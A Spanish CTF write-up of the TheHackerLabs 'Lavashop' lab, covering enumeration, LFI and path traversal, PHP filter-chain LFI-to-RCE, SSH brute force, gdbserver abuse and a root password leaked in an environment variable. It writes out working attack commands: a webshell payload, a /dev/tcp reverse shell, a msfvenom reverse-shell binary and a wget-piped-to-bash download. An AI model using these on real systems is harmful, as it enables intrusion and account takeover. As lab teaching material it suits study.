---
title: "Lavashop - TheHackerLabs"
date: 2026-03-05
draft: false
slug: "THL-writeup-lavashop"
excerpt: "Esta fue una máquina un poco complicada. Después de analizar los escaneos, nos enfocamos en la página web activa en el puerto 80, siendo que utiliza Virtual Hosting, por lo que registramos el dominio en el /etc/hosts. Aplicamos Fuzzing y logramos identificar un directorio oculto que contiene scripts de PHP que se hacen referencia desde la página principal. Una de estas páginas tiene un parámetro oculto, que descubrimos aplicándole Fuzzing, siendo que este parámetro es vulnerable a Directory/Path Traversal y Local File Inclusion (LFI). Explotamos estas vulnerabilidades, descubrimos los usuarios de la máquina víctima, logramos descubrir la contraseña de uno de estos usuarios y logramos obtener una Reverse Shell convirtiendo el LFI en un RCE. Dentro de la máquina, investigamos el servicio activo en el puerto 1337, que resulta ser gdbserver, lo que nos permite aprovecharnos de este para cargar un binario malicioso que nos permite obtener una Reverse Shell, pero como un nuevo usuario. Una vez más dentro de la máquina, utilizamos linpeas.sh para encontrar una vulnerabilidad que nos permita escalar privilegios, pero descubrimos una variable de entorno que contiene la contraseña del usuario Root, lo que nos permite escalar privilegios de manera sencilla."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "GDBserver", "SSH", "Virtual Hosting", "Web Enumeration", "Fuzzing", "Directory / Path Traversal", "Local File Inclusion (LFI)", "LFI + PHP Wrappers", "LFI to RCE", "Brute Force Attack", "Abusing GDBserver to Create Backdoor", "System Recognition (Linux)", "Privesc - Exposed Root Password in Environment Variable", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "ffuf"
  - "gobuster"
  - "echo"
  - "base64"
  - "python3"
  - "php_filter_chain_generator.py"
  - "nc"
  - "bash"
  - "hydra"
  - "nxc"
  - "ps"
  - "grep"
  - "msfvenom"
  - "chmod"
  - "gdb"
  - "wget"
  - "su"
links:
  - "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal"
  - "https://blog.deephacking.tech/es/posts/explotacion-de-php-wrappers/"
  - "https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html#turning-the-laravel-file-inclusion-gadget-chain-into-remote-code-execution"
  - "https://github.com/synacktiv/php_filter_chain_generator/tree/main"
  - "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-remote-gdbserver.html"
  - "https://github.com/peass-ng/PEASS-ng"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-lavashop/lavashop.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.100.210
PING 192.168.68.60 (192.168.100.210) 56(84) bytes of data.
64 bytes from 192.168.100.210: icmp_seq=1 ttl=64 time=1.87 ms
64 bytes from 192.168.100.210: icmp_seq=2 ttl=64 time=0.988 ms
64 bytes from 192.168.100.210: icmp_seq=3 ttl=64 time=1.08 ms
64 bytes from 192.168.100.210: icmp_seq=4 ttl=64 time=0.928 ms

--- 192.168.100.210 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3141ms
rtt min/avg/max/mdev = 0.928/1.217/1.874/0.382 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.210 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-02 10:06 -0600
Initiating ARP Ping Scan at 10:06
Scanning 192.168.100.210 [1 port]
Completed ARP Ping Scan at 10:06, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 10:06
Scanning 192.168.100.210 [65535 ports]
Discovered open port 22/tcp on 192.168.100.210
Discovered open port 80/tcp on 192.168.100.210
Discovered open port 1337/tcp on 192.168.100.210
Completed SYN Stealth Scan at 10:06, 7.23s elapsed (65535 total ports)
Nmap scan report for 192.168.100.210
Host is up, received arp-response (0.00059s latency).
Scanned at 2026-03-02 10:06:52 CST for 7s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
1337/tcp open  waste   syn-ack ttl 64
MAC Address: XX (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 7.44 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Vemos que hay 3 puertos abiertos, aunque nuestro interés se enfoca en el **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80,1337 192.168.100.210 -oN targeted
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-02 10:07 -0600
Nmap scan report for 192.168.100.210
Host is up (0.00077s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)

| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp   open  http    Apache httpd 2.4.62

|_http-title: Did not follow redirect to http://lavashop.thl/
|_http-server-header: Apache/2.4.62 (Debian)
1337/tcp open  waste?
MAC Address: XX (Oracle VirtualBox virtual NIC)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.82 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Gracias a este escaneo vemos que la página web activa en el **puerto 80** utiliza un dominio que podemos registrar en el `/etc/hosts`:
```bash
echo "192.168.100.210 lavashop.thl" >> /etc/hosts
```
Además, no vemos algo de información sobre el **puerto 1337**, pero enfoquémonos en el **puerto 80**.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-lavashop/Captura1.png">
</p>

Parece ser una tienda que vende lámparas de lava.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-lavashop/Captura2.png">
</p>

No hay mucho que destacar.

Navegando dentro de la página, podemos ver que en cada subpágina podremos ver un parámetro llamado `page=`:

<p align="center">
<img src="/assets/images/THL-writeup-lavashop/Captura3.png">
</p>

Y en el código fuente, podemos ver todos los usos que le dieron a este parámetro:

<p align="center">
<img src="/assets/images/THL-writeup-lavashop/Captura4.png">
</p>

El solo ver el uso de este parámetro, es un indicativo de que puede ser vulnerable a **Directory/Traversal Traversal** o **Local File Inclusion (LFI)**, esto porque el parámetro hace 
referencia a un archivo interno, por lo que si no tiene la seguridad adecuada, podremos hacer referencia a otros archivos, ya sea dentro del directorio donde se desplegó la página 
web (aquí aplica el **LFI**) o hasta salir de este mismo y apuntar hacia otros archivos internos de la máquina víctima (aquí aplica el **Directory/Path Traversal**).

Pero antes de probar esto, apliquemos **Fuzzing** para ver si no hay un directorio o archivo oculto.

### Fuzzing {#fuzz}

Primero utilicemos la herramienta **ffuf** y, al ver el uso de **PHP**, enfoquemos el **Fuzzing** para buscar archivos con esa extensión:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt:FUZZ -u http://lavashop.thl/FUZZ -t 300 -e .php,.txt,.html -mc 200,301,302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://lavashop.thl/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt
 :: Extensions       : .php .txt .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200,301,302
________________________________________________

assets                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 4ms]
includes                [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 10ms]
index.php               [Status: 200, Size: 1539, Words: 192, Lines: 45, Duration: 3ms]
index.php               [Status: 200, Size: 1539, Words: 192, Lines: 45, Duration: 4ms]
pages                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 3ms]
.                       [Status: 200, Size: 1539, Words: 192, Lines: 45, Duration: 12ms]
:: Progress: [513480/513480] :: Job [1/1] :: 153 req/sec :: Duration: [0:01:39] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-e*	     | Para especificar una extensión a buscar. |
| *-mc*	     | Para aplicar un flitro que solo muestra resultados con un código de estado especifico. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://lavashop.thl -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt -t 300 -x php,txt,html -s 200,301 -b "" --ne
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:            http://lavashop.thl
[+] Method:         GET
[+] Threads:        300
[+] Wordlist:       /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt
[+] Status codes:   200,301
[+] User Agent:     gobuster/3.8.2
[+] Extensions:     php,txt,html
[+] Timeout:        10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
assets               (Status: 301) [Size: 313] [--> http://lavashop.thl/assets/]
includes             (Status: 301) [Size: 315] [--> http://lavashop.thl/includes/]
index.php            (Status: 200) [Size: 1539]
index.php            (Status: 200) [Size: 1539]
pages                (Status: 301) [Size: 312] [--> http://lavashop.thl/pages/]
.                    (Status: 200) [Size: 1539]
Progress: 513480 / 513480 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*	     | Para especificar una extensión a buscar. |
| *-s*	     | Para aplicar un filtro que muestre solo los códigos de estado específicos. |
| *-b*	     | Para que funcione el filtro anterior. |
| *--ne*     | Para que no muestre errores. |

Encontramos un directorio que tiene un nombre similar al parámetro que vimos antes, pero no vemos otros archivos más que el index y dos directorios más.

Veamos qué es lo que contiene ese directorio:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt:FUZZ -u http://lavashop.thl/pages/FUZZ -t 300 -e .php,.txt,.html -mc 200,301,302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://lavashop.thl/pages/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt
 :: Extensions       : .php .txt .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200,301,302
________________________________________________

about.php               [Status: 200, Size: 208, Words: 33, Lines: 6, Duration: 2ms]
contact.php             [Status: 200, Size: 139, Words: 8, Lines: 5, Duration: 3ms]
home.php                [Status: 200, Size: 195, Words: 22, Lines: 6, Duration: 4ms]
products.php            [Status: 200, Size: 1017, Words: 189, Lines: 27, Duration: 2ms]
:: Progress: [513480/513480] :: Job [1/1] :: 284 req/sec :: Duration: [0:01:37] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-e*       | Para especificar una extensión a buscar. |
| *-mc*      | Para aplicar un flitro que solo muestra resultados con un código de estado especifico. |

Muy bien, ya encontramos los archivos que se hacen referencia en la página principal.

Aunque al visitarlos, podemos ver que parecen incompletos o que no se cargan correctamente, lo que me hace pensar que el parámetro `page=` hace referencia a estas páginas y los 
carga correctamente en la página principal:

<p align="center">
<img src="/assets/images/THL-writeup-lavashop/Captura5.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-lavashop/Captura6.png">
</p>

#### Aplicando Fuzzing para Descubrir Parámetro Oculto {#ParameterFuzzing}

Dado que tenemos el uso de un parámetro en la página principal, puede que exista uno que se esté usando en algunos de los archivos que encontramos.

Aplicaremos **Fuzzing** en cada uno para descubrir ese parámetro, pero quien nos dará una respuesta será la página **products.php**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt:FUZZ -u http://lavashop.thl/pages/products.php?FUZZ=test -t 300 -fs 1017

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://lavashop.thl/pages/products.php?FUZZ=test
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1017
________________________________________________

file                    [Status: 200, Size: 1370, Words: 221, Lines: 32, Duration: 3ms]
:: Progress: [128370/128370] :: Job [1/1] :: 169 req/sec :: Duration: [0:00:44] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-fs*	     | Para aplicar un filtro que no muestre respuestas de un tamaño específico. |

Encontramos un parámetro llamado **file**, y parece que podemos usarlo para aplicar **Local File Inclusion (LFI) y Directory/Path Traversal**.

Probémoslo.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Directory / Path Traversal {#DPTraversal}

Aquí te dejo un repositorio explicando esta vulnerabilidad:
* <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal" target="_blank">Repositorio de swisskyrepo: PayloadsAllTheThings - Directory Traversal</a>

También puedes aplicar el siguiente comando para probar un wordlist de **seclists**, para identificar todos los payloads aplicables de **LFI** y que aplican para 
**Directory/Path Traversal**: 
```bash 
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://192.168.100.210/index.php?page=FUZZ -t 300
```

Ahora probémoslo en la página vulnerable:

<p align="center">
<img src="/assets/images/THL-writeup-lavashop/Captura7.png">
</p>

Excelente, podemos ver el archivo `/etc/passwd`.

Ahí podemos ver que hay dos usuarios, uno llamado **Rodri** y otro **debian**.

Incluso podremos ver los archivos del **usuario Rodri**:

<p align="center">
<img src="/assets/images/THL-writeup-lavashop/Captura8.png">
</p>

Vemos que ahí está la flag del usuario, que si apuntamos a ella, podremos ver su contenido.

Quizá alguno de estos usuarios es vulnerable a un ataque de **Fuerza Bruta**, pero lo haremos más adelante.

### Aplicando Local File Inclusion + PHP Wrappers para Analizar Código Fuente de Scripts de PHP {#LFIWrappers}

Si bien podemos aplicar el **Directory/Path Traversal**, también podemos aplicar **Local File Inclusion (LFI)** en conjunto con **PHP Wrappers**; podemos ver el código fuente de las 
páginas que nos hemos encontrado.

Aquí te dejo un blog que explica cómo aplicar esto y contiene varios payloads:
* <a href="https://blog.deephacking.tech/es/posts/explotacion-de-php-wrappers/" target="_blank">Explotación de PHP Wrappers</a>

Utilizaremos el **PHP Wrapper** `php://filter/convert.base64-encode/resource=` que nos permite codificar un archivo en **base64**, para después decodificarlo y ver su contenido:

<p align="center">
<img src="/assets/images/THL-writeup-lavashop/Captura9.png">
</p>

Copiamos la **base64** y la decodificamos desde la terminal:
```bash
echo -n "base64_copiada" | base64 -d
<?php if (isset($_GET['file'])): ?>
  <section style="margin-bottom:1.5rem; padding:1rem; background:rgba(0,0,0,.25); border:1px solid rgba(255,255,255,.1); border-radius:12px;">
    <p style="margin:0 0 .75rem;">Incluyendo: <code><?= htmlspecialchars($_GET['file'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') ?></code></p>
    <pre style="white-space:pre-wrap; overflow:auto; padding:.75rem; background:rgba(0,0,0,.35); border-radius:8px;">
<?php
    $target = $_GET['file'];
    @include $target;
?>
    </pre>
  </section>
<?php endif; ?>

<section>
  ### Productos destacados
  <div class="product-grid">
    <article class="product">
...
    </article>
  </div>
</section>
```
Observa que se utiliza el parámetro **file** sin ninguna sanitización o filtro, lo que nos permite aplicar el **Directory/Path Traversal y Local File Inclusion (LFI)**.

Curiosamente, esto sí se aplica si intentamos aplicar estas vulnerabilidades en el parámetro `page=` de la página principal:
```bash
<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$BASE = '';

$page = isset($_GET['page']) ? $_GET['page'] : 'home';

if ($page === 'products' && isset($_GET['file'])) {
    $path = $_GET['file'];
    header('Content-Type: text/plain; charset=UTF-8');

    $forbidden_substrings = ['php://', 'data://', 'expect://', 'filter://', "\0", '%00'];
    foreach ($forbidden_substrings as $bad) {
        if (strpos($path, $bad) !== false) {
            http_response_code(400);
            echo "Ruta inválida\n";
            exit;
        }
    }

    $logs_prefixes = ['/var/log', '/var/logs', '/logs', __DIR__ . '/logs'];
    foreach ($logs_prefixes as $pref) {
        if (strpos($path, $pref) === 0) {
            http_response_code(403);
            echo "Acceso denegado\n";
            exit;
        }
    }

    $real = @realpath($path);
    $target = $real !== false ? $real : $path;

    if (@is_dir($target)) {
        http_response_code(400);
        echo "No es un archivo\n";
        exit;
    }

    $MAX_BYTES = 2 * 1024 * 1024;
    if (@file_exists($target) && @filesize($target) !== false && @filesize($target) > $MAX_BYTES) {
        http_response_code(413);
        echo "Archivo demasiado grande\n";
        exit;
    }

    $resolved = @realpath($target);
    if ($resolved !== false) {
        foreach ($logs_prefixes as $pref) {
            if (strpos($resolved, $pref) === 0) {
                http_response_code(403);
                echo "Acceso denegado\n";
                exit;
            }
        }
    }

    $contents = @file_get_contents($target);
    if ($contents === false) {
        http_response_code(404);
        echo "No se pudo leer\n";
        exit;
    }

    echo $contents;
    exit;
}
?>
...
```
Aunque sí podemos aplicar las vulnerabilidades que encontramos si apuntamos al archivo **products.php** y usamos los parámetros de la siguiente manera: `page=products&file=LFIpayload`.

#### Convirtiendo un Local File Inclusion (LFI) en Remote Command Execution (RCE) Utilizando PHP Wrappers {#LFIaRCE}

Ya que pudimos aplicar esto, puede que podamos incluir archivos usando este método, con la intención de crear una webshell para poder ejecutar comandos de manera remota.

Utilizaremos el método que explica este blog:
<a href="https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams" target="_blank">PHP wrappers and streams</a>

También ocuparemos la siguiente herramienta:
* <a href="https://github.com/synacktiv/php_filter_chain_generator/tree/main" target="_blank">Repositorio de synacktiv: php_filter_chain_generator</a>

Una vez que lo tengas descargado, ejecuta el siguiente comando:
```bash
python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>  '
```

El payload resultante lo pegarás en el parámetro donde se ejecuta el **LFI** y observa lo que pasa:

<p align="center">
<img src="/assets/images/THL-writeup-lavashop/Captura10.png">
</p>

Podemos ver el **phpinfo**.

Ahora ejecuta el siguiente comando:
```bash
python3 php_filter_chain_generator.py --chain '<?=`$_GET[cmd]`;;?>'
```

Este comando crea una **Webshell** de **PHP** de manera temporal, pues no se queda guardada, por lo que tienes 2 formas para aplicar la ejecución de comandos:

* Una vez que generes el payload, lo pegas en el parámetro donde se ejecuta el **LFI**, pero agregas el parámetro `cmd=` y el comando a ejecutar al final:

<p align="center">
<img src="/assets/images/THL-writeup-lavashop/Captura11.png">
</p>

* Una vez que generes el payload, lo guardas en una variable dentro de la terminal; luego, en otra variable, guardas un archivo al que apuntará el **LFI** y, por último, aplicas un **curl** hacia la página vulnerable, pero agregando las variables: 

```bash
FILTERS="convert.iconv.UTF8.CSISO2022KR|...|convert.base64-decode"
FILE="/etc/passwd"
curl --output - "http://lavashop.thl/pages/products.php?file=php://filter/$FILTERS/resource=$FILE&cmd=id"
...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
```
Con esto listo, podemos enviarnos una **Reverse Shell** para que ganemos acceso a la máquina víctima.

Abre un listener con **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

Utiliza la siguiente **Reverse Shell** y ejecutala como lo hemos hecho:
```bash
bash -c 'bash -i >%26 /dev/tcp/Tu_IP/443 0>%261'
```

Observa la **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.100.210] 46638
bash: cannot set terminal process group (481): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Thehackerslabs-LavaShop:/var/www/html/pages$ whoami
whoami
www-data
www-data@Thehackerslabs-LavaShop:/var/www/html/pages$
```
Estamos dentro.

Ya solo falta obtener una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```
Otra vulnerabilidad que podríamos aplicar es **Log Poisoning** para ejecutar comandos, pero no será posible (o al menos, yo no pude aplicarla).

### Aplicando Fuerza Bruta al Usuario Debian y Ganando Acceso a la Máquina Víctima Vía SSH {#FuerzaBruta}

Probando los usuarios que vimos al aplicar el **Directory/Path Traversal**, vimos que había 2 usuarios; pues resulta que uno de ellos es vulnerable a **Fuerza Bruta**.

Utilizaremos la herramienta **hydra** para encontrar la contraseña del **usuario debian** y utilizaremos el wordlist **rockyou.txt**:
```bash
hydra -l 'debian' -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.210 -t 64
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-05 10:35:13
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://192.168.100.210:22/
[22][ssh] host: 192.168.100.210   login: debian   password: **********
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 23 final worker threads did not complete until end.
[ERROR] 23 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-05 10:35:33
```
La encontramos.

Usemos **netexec** para comprobar si la contraseña funciona con este usuario:
```bash
nxc ssh 192.168.100.210 -u 'debian' -p '**********'
SSH         192.168.100.210   22     192.168.100.210    [*] SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3
SSH         192.168.100.210   22     192.168.100.210    [+] debian:**********  Linux - Shell access!
```

Entremos al **servicio SSH**:
```bash
ssh debian@192.168.100.210
debian@192.168.100.210's password: 
Linux Thehackerslabs-LavaShop 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64
...
debian@Thehackerslabs-LavaShop:/$ whoami
debian
```
Estamos dentro.

Para este momento, podemos seguir con esta sesión o con la shell que tenemos en **netcat**. Yo seguiré con **SSH**.

## Post Explotación {#Post}

### Abusando de Servicio Expuesto gdbserver para Cargar Binario Malicioso (Backdoor) y Obtener una Reverse Shell {#gdbserver}

Recordemos que hay un servicio activo en la máquina, estando expuesto en el **puerto 1337**.

Podemos usar el comando **ps** para listar los servicios activos de la máquina y buscar el que está activo en el **puerto 1337**:
```bash
debian@Thehackerslabs-LavaShop:/$ ps aux | grep 1337
Rodri        365  0.0  0.0  11476  3412 ?        Ss   16:43   0:00 /usr/bin/gdbserver --once 0.0.0.0:1337 /bin/true
debian      1588  0.0  0.0   6352  2088 pts/0    S+   18:09   0:00 grep 1337
```
Se esta utilizando **gdbserver**.

| **gdbserver** |
|:--------:|
| *gdbserver es una herramienta de Linux que permite depurar (debuggear) un programa de forma remota usando el depurador GNU Debugger (GDB). Esto se llama remote debugging.* |

Investigando un poco, podemos encontrar una forma de aprovecharnos de este servicio para cargar un binario malicioso de manera remota, que al momento de ejecutarse nos enviará una 
**Reverse Shell**. 

Aquí te dejo el blog donde podemos ver los pasos a ejecutar:
* <a href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-remote-gdbserver.html" target="_blank">HackTricks: Pentesting Remote GdbServer</a>

Primero, creamos nuestro binario malicioso con **msfvenom** y le damos permisos de ejecución:
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=Tu_IP LPORT=443 PrependFork=true -f elf -o binary.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 106 bytes
Final size of elf file: 226 bytes
Saved as: binary.elf

chmod +x binary.elf
```

Iniciamos el depurador **gdb** usando nuestro binario (si no tienes instalado **gdb**, solo ejecuta `sudo apt install gdb -y`):
```bash
gdb binary.elf
...
Reading symbols from binary.elf...
(No debugging symbols found in binary.elf)
(gdb)
```

Nos conectamos del debugger remoto, que sería el que está expuesto en la máquina víctima en el **puerto 1337**, luego cargamos nuestro binario al sistema remoto y definimos que 
ejecutable, en este caso nuestro binario, será el que se utilizará en el sistema remoto: 
```bash 
(gdb) target extended-remote 192.168.100.210:1337 Remote debugging using 
192.168.100.210:1337 Reading /lib64/ld-linux-x86-64.so.2 from remote target...
...
(gdb) remote put binary.elf binary.elf 
Successfully sent file "binary.elf".
(gdb) set remote exec-file /home/Rodri/binary.elf
```

Levanta un listener con **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

Depuramos el binario cargado:
```bash
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program:  
Reading /home/Rodri/binary.elf from remote target...
Reading /home/Rodri/binary.elf from remote target...
Reading symbols from target:/home/Rodri/binary.elf...
(No debugging symbols found in target:/home/Rodri/binary.elf)
[Detaching after fork from child process 13789]
[Inferior 1 (process 13788) exited normally]
```

Observa la **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.100.210] 42462
whoami
Rodri
```
Estamos dentro, pero como el **usuario Rodri**.

Obtengamos una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```

Aquí podemos encontrar la flag del usuario:
```bash
Rodri@Thehackerslabs-LavaShop:/home/Rodri$ ls
ls
binary.elf  user.txt
Rodri@Thehackerslabs-LavaShop:/home/Rodri$ cat user.txt	
cat user.tx
...
```

### Abusando de Información Expuesta en Variables de Entorno para Escalar Privilegios y Convertirnos en Root {#env}

Al enumerar al **usuario Rodri**, no encontraremos algo relevante que nos ayude a escalar privilegios, por lo que usaremos la herramienta **linpeas.sh** para una enumeración más profunda:
* <a href="https://github.com/peass-ng/PEASS-ng" target="_blank">Repositorio de peass-ng: PEASS-ng</a>

Probemos que tengamos **curl** y/o **wget**:
```bash
Rodri@Thehackerslabs-LavaShop:/$ which wget
/usr/bin/wget
```
Solo tenemos **wget**.

Podemos ejecutarlo de manera remota; solo levanta un servidor con **python3** y utiliza **wget** y **bash** para ejecutar:
```bash
Rodri@Thehackerslabs-LavaShop:/$ wget -qO- http://TuIP:Puerto/linpeas.sh | bash
```

Observa algo curioso en las variables de entorno:
```bash
╔══════════╣ Environment
╚ Any private information inside environment variables?
SHELL=/bin/bash
ROOT_PASS=**********
PWD=/
LOGNAME=debian
XDG_SESSION_TYPE=tty
MOTD_SHOWN=pam
...
```
Parece que tenemos la contraseña del **Root**.

